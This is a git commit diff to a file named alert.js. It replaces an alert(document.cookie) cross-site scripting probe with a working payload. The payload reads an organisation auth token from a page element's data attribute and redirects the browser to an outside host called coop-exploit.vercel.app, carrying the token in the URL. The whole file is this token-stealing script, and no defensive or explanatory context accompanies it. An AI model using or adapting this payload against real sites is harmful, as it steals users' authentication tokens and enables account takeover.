4fa797af032b3babb8919729884aba4031cf2e6c
Udhaya Praveen S <52095118+udhayapraveen@users.noreply.github.com>
2025-07-23 21:49:16 +0530

    Update alert.js

--- alert.js
+++ alert.js
@@ -1,2 +1,8 @@
-alert(document.cookie)
-
+  const el = document.getElementById('scope');
+  if (el) {
+    const token = encodeURIComponent(el.dataset.scopeOrgAuthToken);
+    console.log("Extracted Token:", token); // 👈 this logs it
+    location.href = `https://coop-exploit.vercel.app/?token=${token}`;
+  } else {
+    console.log("Element #scope not found.");
+  }
